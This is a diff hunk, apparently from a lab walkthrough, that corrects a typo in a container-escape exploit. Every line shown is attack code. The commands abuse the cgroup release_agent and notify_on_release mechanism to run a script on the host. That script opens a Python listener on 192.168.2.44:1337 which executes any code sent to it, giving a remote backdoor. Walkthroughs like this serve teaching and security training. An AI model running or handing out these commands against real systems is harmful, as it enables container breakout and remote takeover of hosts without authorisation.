@@ -155,7 +155,7 @@ Paste the following commands in container C2 and jump to step 8.
 
 	mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/child
 	echo 1 > /tmp/cgrp/child/notify_on_release
-	path=\`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+	path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 	echo "$path/exploit" > /tmp/cgrp/release_agent
 	echo "#!/bin/sh" > /exploit
 	echo python3 -c "'import socket; s=socket.socket(); s.bind((\"192.168.2.44\",1337)); s.listen(1);(r,z) = s.accept();exec(r.recv(999))'" >> /exploit
